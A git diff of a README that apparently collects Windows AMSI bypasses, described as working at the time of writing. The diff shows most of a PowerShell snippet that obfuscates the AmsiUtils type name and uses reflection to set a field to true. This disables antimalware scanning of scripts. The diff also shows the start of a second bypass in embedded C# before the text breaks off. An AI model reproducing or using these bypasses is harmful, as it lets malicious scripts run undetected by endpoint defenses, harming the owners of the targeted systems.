@@ -1,8 +1,7 @@
-# AMSI-Bypass
-
-## The below AMSI bypasses are some I have found that at the time of writing that are working. 
+# AMSI-Bypass (working at the time of writing)
 
 
+## AMSI Bypass 1
 ```
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
@@ -11,6 +10,7 @@ $field.SetValue($null,$true)
 ```
 
 
+## AMSI Bypass 2
 ```
 $ZQCUW = @"
 using System;
